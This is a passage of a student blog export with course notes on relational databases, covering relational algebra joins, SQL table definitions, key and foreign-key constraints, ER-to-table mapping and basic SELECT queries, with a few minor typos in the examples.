<li><p>Cartesian product with selection<br>$$ R \Join_{c} S &#x3D; \sigma_{c} \space ( R \times S) $$</p>
  <img src="https://p.ipic.vip/rv7eax.png" width="500px" />
</li>
<li><p>Situation: Find maximum</p>
<ol>
<li><p>Select the employees whose salary is not the greatest<br> $$ \rho \space (R, \space \Pi_{E.name} \space ( E \space \Join_{E.salary \space &lt; \space F.salary} \space \rho (F, E)))$$</p>
 <img src="https://p.ipic.vip/cs5znb.png" width="400px" />
</li>
<li><p>Different (Remove the selected employee)<br> $$ \rho \space (Result, \Pi_{name} \space (E) - R) $$</p>
 <img src="https://p.ipic.vip/hooft9.png" width="300px" /></li>
</ol>
</li>
</ul>
<h3 id="Equi-Join"><a href="#Equi-Join" class="headerlink" title="Equi Join"></a>Equi Join</h3><ul>
<li>the join condition consists solely of equalities<br>$$ R \Join_{R.b \space &#x3D; \space S.b} S$$  <img src="https://p.ipic.vip/a5t0yl.png" width="400px" /></li>
</ul>
<h3 id="Natural-Join"><a href="#Natural-Join" class="headerlink" title="Natural Join"></a>Natural Join</h3><ul>
<li>An equi join in which equalities are specified on all fields having the same names in R and S<br>$$ R \Join S &#x3D; R \Join_{R.b \space &#x3D; \space S.b \space \land \space R.d \space &#x3D; \space S.d } S $$  <img src="https://p.ipic.vip/h49ps8.png" width="400px" /></li>
</ul>
<h2 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h2><ul>
<li>The division operation is useful for expressing certain kinds of queries</li>
<li>Example: find the names of sailors who have reserved all boats</li>
</ul>
<!-- 
<img src="" width="500px" />
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>CSCI3170</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3170 - Relational Model</title>
    <url>/myBlog/2023/02/15/2023/CSCI3170/2023-2-15-CSCI3170-RelationalModel/</url>
    <content><![CDATA[<style>
/* table{
    text-align: center;
    margin: auto auto;
    width: fit-content;
}

table th {
    display: solid;
    width: 80px;
} */
.block {
    width: 80px;
}
</style>

<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="Relations"><a href="#Relations" class="headerlink" title="Relations"></a>Relations</h3><ol>
<li><p>Relation Schema</p>
<ul>
<li>the column heads for the table which contains <font color="3A75EA">name of each field</font> and the <font color="3A75EA">domain of each field</font><ul>
<li>e.g. Students( <ins>sid</ins>: <code>string</code>, name: <code>string</code>, login: <code>string</code>, age: <code>integer</code>, gpa: <code>real</code> )<table>
<thead>
<tr>
<th align="center"><ins>sid</ins></th>
<th align="center">name</th>
<th align="center">login</th>
<th align="center">age</th>
<th align="center">gpa</th>
</tr>
</thead>
</table>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Relation Instance</p>
<ul>
<li><p>a table with rows and columns </p>
<ul>
<li>e.g. <table>
<thead>
<tr>
<th align="center"><ins>sid</ins></th>
<th align="center">name</th>
<th align="center">login</th>
<th align="center">age</th>
<th align="center">gpa</th>
</tr>
</thead>
<tbody><tr>
<td align="center">50000</td>
<td align="center">Dave</td>
<td align="center">dave@cs</td>
<td align="center">19</td>
<td align="center">3.3</td>
</tr>
<tr>
<td align="center">53666</td>
<td align="center">Jones</td>
<td align="center">jones@cs</td>
<td align="center">18</td>
<td align="center">3.4</td>
</tr>
<tr>
<td align="center">53688</td>
<td align="center">Smith</td>
<td align="center">smith#@ee</td>
<td align="center">18</td>
<td align="center">3.2</td>
</tr>
<tr>
<td align="center">53650</td>
<td align="center">Smith</td>
<td align="center">smith@math</td>
<td align="center">19</td>
<td align="center">3.8</td>
</tr>
<tr>
<td align="center">53831</td>
<td align="center">Madayan</td>
<td align="center">madayan@music</td>
<td align="center">11</td>
<td align="center">1.8</td>
</tr>
<tr>
<td align="center">53832</td>
<td align="center">Guldu</td>
<td align="center">guldu@music</td>
<td align="center">20</td>
<td align="center">2.0</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>Reminder:</p>
<ol>
<li><font color="F54747">no two rows are identical</font></li>
<li>the order in the rows and fields are listed is not important</li>
</ol>
</li>
</ul>
</li>
<li><p>Definitions:</p>
<ol>
<li><font color="3A75EA">degree</font>: the number of fields</li>
<li><font color="3A75EA">cardinality</font>: the number of tuples (records)</li>
<li><font color="3A75EA">relational database</font>: a collection of relations with distinct relation names</li>
<li><font color="3A75EA">relational database schema</font>: the collection of schemas for the relations in the database</li>
<li><font color="3A75EA">instance</font> of relational database: a collection of relation instances</li>
</ol>
</li>
</ol>
<h3 id="Data-Definition-Language"><a href="#Data-Definition-Language" class="headerlink" title="Data Definition Language"></a>Data Definition Language</h3><ol>
<li><p>Create</p>
<ul>
<li>create the Student relation  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> Students(</span><br><span class="line">    sid    <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    name   <span class="type">CHAR</span>(<span class="number">30</span>),</span><br><span class="line">    login  <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    age    <span class="type">INTEGER</span>,</span><br><span class="line">    gpa    <span class="type">REAL</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Insert</p>
<ul>
<li>insert a single tuple  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Insert</span></span><br><span class="line"><span class="keyword">into</span>        Students (sid, name, login, age, gpa)</span><br><span class="line"><span class="keyword">Values</span>      (<span class="number">53688</span>, <span class="string">&#x27;Smith&#x27;</span>, <span class="string">&#x27;smith@ee&#x27;</span>, <span class="number">18</span>, <span class="number">3.2</span>)</span><br></pre></td></tr></table></figure></li>
<li><font color="3A75EA">Noted</font>: it is not necessary to list out the name of fields, but make sure to <font color="F54747">match the order</font></li>
</ul>
</li>
<li><p>Delete</p>
<ul>
<li>delete tuples  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span></span><br><span class="line"><span class="keyword">From</span>    Students S</span><br><span class="line"><span class="keyword">WHERE</span>   S.name <span class="operator">=</span> <span class="string">&#x27;Smith&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Update</p>
<ul>
<li>modify the column values in an existing row  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span>  Students S</span><br><span class="line"><span class="keyword">SET</span>     S.age <span class="operator">=</span> S.age <span class="operator">+</span> <span class="number">1</span>, S.gpa <span class="operator">=</span> S.gpa <span class="operator">-</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">WHERE</span>   S.sid <span class="operator">=</span> <span class="number">53688</span></span><br></pre></td></tr></table></figure></li>
<li><font color="3A75EA">Noted</font>: it would identify all satisfied records then update them</li>
<li>e.g.  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span>  Students S</span><br><span class="line"><span class="keyword">SET</span>     S.gpa <span class="operator">=</span> S.gpa <span class="operator">-</span> <span class="number">0.1</span></span><br><span class="line"><span class="keyword">WHERE</span>   S.gpa <span class="operator">&gt;=</span> <span class="number">3.3</span></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="center"><ins>sid</ins></th>
<th align="center">name</th>
<th align="center">login</th>
<th align="center">age</th>
<th align="center">gpa</th>
</tr>
</thead>
<tbody><tr>
<td align="center">50000</td>
<td align="center">Dave</td>
<td align="center">dave@cs</td>
<td align="center">19</td>
<td align="center"><font color="F54747">3.2</font></td>
</tr>
<tr>
<td align="center">53666</td>
<td align="center">Jones</td>
<td align="center">jones@cs</td>
<td align="center">18</td>
<td align="center"><font color="F54747">3.3</font></td>
</tr>
<tr>
<td align="center">53688</td>
<td align="center">Smith</td>
<td align="center">smith#@ee</td>
<td align="center">18</td>
<td align="center">3.2</td>
</tr>
<tr>
<td align="center">53650</td>
<td align="center">Smith</td>
<td align="center">smith@math</td>
<td align="center">19</td>
<td align="center"><font color="F54747">3.7</font></td>
</tr>
<tr>
<td align="center">53831</td>
<td align="center">Madayan</td>
<td align="center">madayan@music</td>
<td align="center">11</td>
<td align="center">1.8</td>
</tr>
<tr>
<td align="center">53832</td>
<td align="center">Guldu</td>
<td align="center">guldu@music</td>
<td align="center">20</td>
<td align="center">2.0</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ol>
<h3 id="Key-Constraint"><a href="#Key-Constraint" class="headerlink" title="Key Constraint"></a>Key Constraint</h3><ul>
<li>certain minimal subset of the fields, which is a <font color="F54747">unique identifier</font> for a tuple, declare by <code>UNIQUE</code> command</li>
<li>designer can also identify a <font color="F54747">primary key</font> by <code>PRIMARY KEY</code>  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> Students(</span><br><span class="line">    sid    <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    name   <span class="type">CHAR</span>(<span class="number">30</span>),</span><br><span class="line">    login  <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    age    <span class="type">INTEGER</span>,</span><br><span class="line">    gpa    <span class="type">REAL</span>,</span><br><span class="line">    <span class="keyword">UNIQUE</span>(name, age),     <span class="comment">-- a key: not allow two records have the same name and age</span></span><br><span class="line">    <span class="keyword">CONSTRAINT</span> StudentsKey <span class="keyword">PRIMARY</span> KEY (sid)    <span class="comment">-- a primary key</span></span><br><span class="line">)   <span class="comment">-- the constraint name StudentsKey is not necessary to be set</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Foreign-Key"><a href="#Foreign-Key" class="headerlink" title="Foreign Key"></a>Foreign Key</h3><ul>
<li>a set of fields in one relation r that is used to <font color="F54747">refer</font> to a tuple in another relation s<ul>
<li><p>e.g.</p>
<table>
<thead>
<tr>
<th align="center"><ins>cid</ins></th>
<th align="center">grade</th>
<th align="center">sid</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CSC101</td>
<td align="center">D</td>
<td align="center">53831</td>
</tr>
<tr>
<td align="center">ERG202</td>
<td align="center">B</td>
<td align="center">53832</td>
</tr>
<tr>
<td align="center">IEE321</td>
<td align="center">A</td>
<td align="center">53650</td>
</tr>
<tr>
<td align="center">PSY203</td>
<td align="center">B</td>
<td align="center">53666</td>
</tr>
</tbody></table>
</li>
<li><p>In this case, <font color="3A75EA">sid</font> would be the <font color="3A75EA">foreign key</font></p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Enrolled&#123;</span><br><span class="line">    sid     <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    cid     <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    grade   <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (sid, cid),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (sid) <span class="keyword">REFERENCES</span> Students</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>Noted:</p>
<ol>
<li>Cannot insert <code>&lt;55555, ART104, A&gt;</code> because there is no tuple in <code>Students</code> with <code>sid = 55555</code>.</li>
<li>Cannot delete <code>&lt;53666, Jones, ...&gt;</code> because there is a tuple from <code>Enrolled</code> with <code>sid = 53666</code>.</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="Foreign-key-violations"><a href="#Foreign-key-violations" class="headerlink" title="Foreign key violations"></a>Foreign key violations</h3><ol>
<li><p>Insert:</p>
<ul>
<li>insert a row to <code>Enrolled</code> with a sid value that does not appear in <code>Students</code></li>
<li>The <code>INSERT</code> is <font color="F54747">reject</font></li>
</ul>
</li>
<li><p>Delete &amp; Update:</p>
<ul>
<li>Delete or update a <code>Students</code> row, the row in <code>Enrolled</code> refer to the target can have following operations:<ol>
<li>Delete <font color="F54747">all rows</font> in <code>Enrolled</code> that refer to the delete <code>Students</code> row</li>
<li>Disallow the deletion</li>
<li>Set the sid column in <code>Enrolled</code> row that refers to it to <code>default</code></li>
<li>Set the sid column in <code>Enrolled</code> row that refers to it to <code>null</code></li>
</ol>
</li>
</ul>
</li>
</ol>
<ul>
<li><p>Operations:</p>
<ol>
<li><p><code>NO ACTION</code> (default)</p>
<ul>
<li>The action (<code>DELETE</code> or <code>UPDATE</code>) is to be rejected</li>
</ul>
</li>
<li><p><code>CASCADE</code></p>
<ul>
<li>If <code>Students</code> row is deleted, all <code>Enrolled</code> rows that refer to it are deleted</li>
</ul>
</li>
<li><p><code>SET DEFAULT</code></p>
<ul>
<li>Switch the <code>Enrolled</code> row to a <code>DEFAULT</code> student</li>
</ul>
</li>
<li><p><code>SET NULL</code></p>
<ul>
<li>Allow the use of <code>NULL</code> as the <code>DEFAULT</code> value</li>
</ul>
</li>
</ol>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Enrolled&#123;</span><br><span class="line">    sid     <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    cid     <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    grade   <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (sid, cid),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (sid) <span class="keyword">REFERENCES</span> Students</span><br><span class="line">                        <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE</span><br><span class="line">                        <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="keyword">NO</span> ACTION</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Logical-Database-Design"><a href="#Logical-Database-Design" class="headerlink" title="Logical Database Design"></a>Logical Database Design</h2><h3 id="Entity-Sets"><a href="#Entity-Sets" class="headerlink" title="Entity Sets"></a>Entity Sets</h3><img src="https://p.ipic.vip/fd10un.png" width="250px"/>

<ol>
<li><p>Attributes:</p>
<ul>
<li>all attributes of that entity</li>
</ul>
</li>
<li><p>Keys:</p>
<ul>
<li>the primary key and condidate keys (if exist)</li>
</ul>
</li>
<li><p>Entity Set:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
</ul>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Employees(</span><br><span class="line">    id      <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    name    <span class="type">CHAR</span>(<span class="number">30</span>),</span><br><span class="line">    lot     <span class="type">INTEGER</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY(id)     <span class="comment">-- primary key &#123;id&#125;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Relationship-Sets"><a href="#Relationship-Sets" class="headerlink" title="Relationship Sets"></a>Relationship Sets</h3><img src="https://p.ipic.vip/49vkub.png" width="400px" />

<ol>
<li><p>Attributes:</p>
<ul>
<li>the primary key attributes of each participating entity set</li>
<li>its own attribute</li>
<li>the descriptive attribute</li>
</ul>
</li>
<li><p>Keys:</p>
<ul>
<li><font color="F54747">primary key</font>: the group of primary keys of each participating entity</li>
<li>the foreign keys</li>
</ul>
</li>
<li><p>Entity Table:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
<li><strong>Departments</strong>: <ins>did</ins>, dname, budget</li>
<li><strong>Locations</strong>: <ins>address</ins>, capacity</li>
</ul>
</li>
<li><p>Relationship Table:</p>
<ul>
<li><strong>Work_In2</strong>: id, did, address, since (<font color="F54747">primary key</font>: <code>&#123;id, did, address&#125;</code>)</li>
</ul>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Work_In2(</span><br><span class="line">    <span class="comment">-- primary key of each participating entity set</span></span><br><span class="line">    id      <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    did     <span class="type">INTEGER</span>,</span><br><span class="line">    address <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    <span class="comment">-- its own attribute</span></span><br><span class="line">    since   <span class="type">DATE</span>,</span><br><span class="line">    <span class="comment">-- primary key (cannot be null)</span></span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id, did, address),  <span class="comment">-- the group of primary keys of each entity</span></span><br><span class="line">    <span class="comment">-- foreign keys</span></span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (id) <span class="keyword">REFERENCES</span> Employees,</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (did) <span class="keyword">REFERENCES</span> Departments,</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (address) <span class="keyword">REFERENCES</span> Locations</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><p>demonstrating on descriptive attributes</p>
  <img src="https://p.ipic.vip/yhhwjs.png" width="250px" /></li>
</ul>
<ol start="3">
<li><p>Entity Table:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
</ul>
</li>
<li><p>Relationship Table:</p>
<ul>
<li><strong>Reoports_To</strong>: supervisor_id, subordinate_id (<font color="F54747">primary key</font>: <code>&#123;supervisor_id, subordinate_id&#125;</code>)</li>
</ul>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Reoports_To(</span><br><span class="line">    <span class="comment">-- the descriptive attributes</span></span><br><span class="line">    supervisor_id   <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    subordinate_id  <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    <span class="comment">-- primary key</span></span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (supervisor_id, subordinate_id),    <span class="comment">-- the group of attributes</span></span><br><span class="line">    <span class="comment">-- foreign keys (relate the descriptive attributes to the associated attribute)</span></span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (supervisor_id) <span class="keyword">REFERENCES</span> Employees(id),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (subordinate_id) <span class="keyword">REFERENCES</span> Employees(id),</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Relationship-Sets-Key-Constraints"><a href="#Relationship-Sets-Key-Constraints" class="headerlink" title="Relationship Sets (Key Constraints)"></a>Relationship Sets (<font color="3A75EA">Key Constraints</font>)</h3><img src="https://p.ipic.vip/h6bfwe.png" width="400px" />

<ul>
<li>each department has <font color="3A75EA">at most one</font> manager (i.e., no two tuples can have same <code>did</code> but can have same <code>id</code> in <code>Managers</code> table)</li>
<li><code>did</code> is the primary &#x2F; candidate key but <code>&#123;id, did&#125;</code> is not as it is not minimal</li>
</ul>
<ol>
<li><p>Attributes:</p>
<ul>
<li>all attributes of the entity set with the candidate key</li>
<li>the primary key attributes of each participating entity set</li>
<li>its own attributes</li>
</ul>
</li>
<li><p>Keys:</p>
<ul>
<li><font color="F54747">primary key</font>: the only required primary key</li>
<li>the foreign keys</li>
</ul>
</li>
<li><p>Entity Table:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
<li><strong>Departments</strong>: <ins>did</ins>, dname, budget</li>
</ul>
</li>
<li><p>Relationship Table:</p>
<ul>
<li><strong>Managers</strong>: <ins>did</ins>, dname, budget, id, since (<font color="F54747">primary key</font>: <code>&#123;did&#125;</code>)</li>
</ul>
</li>
</ol>
<ul>
<li><p>Cons: if a lot of departments have no manager, it is wasting space</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Managers(</span><br><span class="line">    <span class="comment">-- all attributes of the entity set with the candidate key</span></span><br><span class="line">    did     <span class="type">INTEGER</span>,</span><br><span class="line">    dname   <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    budget  <span class="type">REAL</span>,</span><br><span class="line">    <span class="comment">-- primary key of each entity set</span></span><br><span class="line">    id      <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    <span class="comment">-- its own attributes</span></span><br><span class="line">    since   <span class="type">DATE</span>,</span><br><span class="line">    <span class="comment">-- primary key (not the set of primary keys in entity sets)</span></span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (did),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (id) <span class="keyword">REFERENCES</span> Employees</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Relationship-Sets-Participation-Constraints"><a href="#Relationship-Sets-Participation-Constraints" class="headerlink" title="Relationship Sets (Participation Constraints)"></a>Relationship Sets (<font color="3A75EA">Participation Constraints</font>)</h3><img src="https://p.ipic.vip/kay8v8.png" width="400px" />

<ul>
<li><p>each department has <font color="3A75EA">exactly one one</font> manager (i.e., <code>id</code> cannot set to be <code>DELETE</code>)</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Managers(</span><br><span class="line">    did     <span class="type">INTEGER</span>,</span><br><span class="line">    dname   <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    budget  <span class="type">REAL</span>,</span><br><span class="line">    id      <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    since   <span class="type">DATE</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (did),</span><br><span class="line">    <span class="comment">-- must have one manager (turn on cannot DELETE)</span></span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (id) <span class="keyword">REFERENCES</span> Employees <span class="keyword">ON</span> <span class="keyword">DELETE</span> <span class="keyword">NO</span> ACTION     </span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Week-Entity-Sets"><a href="#Week-Entity-Sets" class="headerlink" title="Week Entity Sets"></a>Week Entity Sets</h3><img src="https://p.ipic.vip/sr2epq.png" width="400px" />

<ul>
<li><p>The weak entity set always</p>
<ul>
<li>participates in a one-to-many binary relationship</li>
<li>has a key constraint</li>
<li>has total participation</li>
</ul>
</li>
<li><p>Primary key: <code>&#123;id, pname&#125;</code> as <code>Dependents</code> is a weak entity</p>
</li>
</ul>
<ol>
<li><p>Attributes:</p>
<ul>
<li>all attributes of the entity set with the candidate key</li>
<li>the primary key attributes of each participating entity set</li>
<li>its own attributes</li>
</ul>
</li>
<li><p>Keys:</p>
<ul>
<li><font color="F54747">primary key</font>: the group of primary key in participating entity</li>
<li>the foreign keys</li>
</ul>
</li>
<li><p>Entity Table:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
<li><strong>Departments</strong>: <ins>did</ins>, dname, budget</li>
</ul>
</li>
<li><p>Relationship Table:</p>
<ul>
<li><strong>Managers</strong>: did, dname, budget, id, since (<font color="F54747">primary key</font>: <code>&#123;id, pname&#125;</code>)</li>
</ul>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Policy(</span><br><span class="line">    <span class="comment">-- all attributes of the entity set</span></span><br><span class="line">    pname   <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    age     <span class="type">INTEGER</span>,</span><br><span class="line">    <span class="comment">-- the primary key of each participating entity</span></span><br><span class="line">    id      <span class="type">CHAR</span>(<span class="number">11</span>),</span><br><span class="line">    <span class="comment">-- its own attributes</span></span><br><span class="line">    cost    <span class="type">REAL</span>,</span><br><span class="line">    <span class="comment">-- primary key</span></span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (pname,id),</span><br><span class="line">    <span class="comment">-- ensure that information about employee&#x27;s policy and dependents is deleted</span></span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (id) <span class="keyword">REFERENCES</span> Employees <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Class-Hierarchies"><a href="#Class-Hierarchies" class="headerlink" title="Class Hierarchies"></a>Class Hierarchies</h3><img src="https://p.ipic.vip/d3y6w4.png" width="450px" />

<ol>
<li>Entity Table:<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
<li><strong>Hourly-Emps</strong>: <ins>id</ins>, hour_worked, hour_wages</li>
<li><strong>Contract-Emps</strong>: <ins>id</ins>, contract_id</li>
</ul>
</li>
</ol>
<h3 id="Aggregation"><a href="#Aggregation" class="headerlink" title="Aggregation"></a>Aggregation</h3><img src="https://p.ipic.vip/hz86ip.png" width="500px" />

<ol>
<li><p>Entity Table:</p>
<ul>
<li><strong>Employees</strong>: <ins>id</ins>, name, lot</li>
<li><strong>Departments</strong>: <ins>did</ins>, dname, budget</li>
<li><strong>Projects</strong>: <ins>pid</ins>, started-on, pbudget</li>
</ul>
</li>
<li><p>Relationship Table:</p>
<ul>
<li><strong>Monitors</strong>: id, pid, did, until (<font color="F54747">primary key</font>: <code>&#123;id, pid, did&#125;</code>)</li>
<li><strong>Sponsors</strong>: pid, did, since (<font color="F54747">primary key</font>: <code>&#123;pid, did&#125;</code>)</li>
</ul>
</li>
</ol>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>CSCI3170</tag>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3170 - Structured Query Language</title>
    <url>/myBlog/2023/03/10/2023/CSCI3170/2023-3-10-CSCI3170-SQL/</url>
    <content><![CDATA[<h2 id="Basic-Query"><a href="#Basic-Query" class="headerlink" title="Basic Query"></a>Basic Query</h2><h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><ol>
<li><code>SELECT</code> clause<ul>
<li>specify the columns that you want to retrieve from a database table</li>
</ul>
</li>
</ol>
<ul>
<li><code>DISTINCT</code> keyword (optional)<ul>
<li>return only unique values from a specific column (i.e., it would eliminate the outputs)</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p><code>FROM</code> clause</p>
<ul>
<li>specify the table or tables from which you want to retrieve data</li>
</ul>
</li>
<li><p><code>WHERE</code>clause (optional)</p>
<ul>
<li>filter data based on a specific condition</li>
</ul>
</li>
</ol>
<ul>
<li><p>$$\Pi_{a_1, a_2, \cdots, a_n}( \space \sigma_P ( \space R_1 \times R_2 \times \cdots \times R_m))$$</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> a1, a2, ..., an    <span class="comment">-- target list</span></span><br><span class="line"><span class="keyword">FROM</span> R1, R2, ..., Rm    <span class="comment">-- relation list</span></span><br><span class="line"><span class="keyword">WHERE</span> P     <span class="comment">-- qualification</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Examples:</p>
<ol>
<li><p>Find the names of sailors who have reserved boat number 103</p>
 <img src="https://p.ipic.vip/26oc0w.png" width="500px" />
 
<ul>
<li>$$\Pi_{S.sname}( \space \sigma_{R.sid &#x3D; S.sid \space \land \space R.bid &#x3D; 103} ( S \times R))$$  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.sid <span class="operator">=</span> S.sid <span class="keyword">AND</span> R.bid <span class="operator">=</span> <span class="number">103</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Given following schema:</p>
 <img src="https://p.ipic.vip/e72rar.png" width="400px" />

<ol>
<li><p>Find the sids of sailors who have reserved a red boat</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Find the names of sailors who have reserved a red boat</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S, Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> S.sid <span class="operator">=</span> R.sid <span class="keyword">AND</span> B.bid <span class="operator">=</span> R.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Find the colors of boats reserved by Lubber</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> B.color</span><br><span class="line"><span class="keyword">FROM</span> Sailors S, Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> S.sname <span class="operator">=</span> <span class="string">&#x27;Lubber&#x27;</span> <span class="keyword">AND</span> S.sid <span class="operator">=</span> R.sid <span class="keyword">AND</span> B.bid <span class="operator">=</span> R.bid</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
</ul>
<h3 id="Expressions-amp-Strings"><a href="#Expressions-amp-Strings" class="headerlink" title="Expressions &amp; Strings"></a>Expressions &amp; Strings</h3><ol>
<li><p><code>AS</code> and <code>=</code> (name field)</p>
<ul>
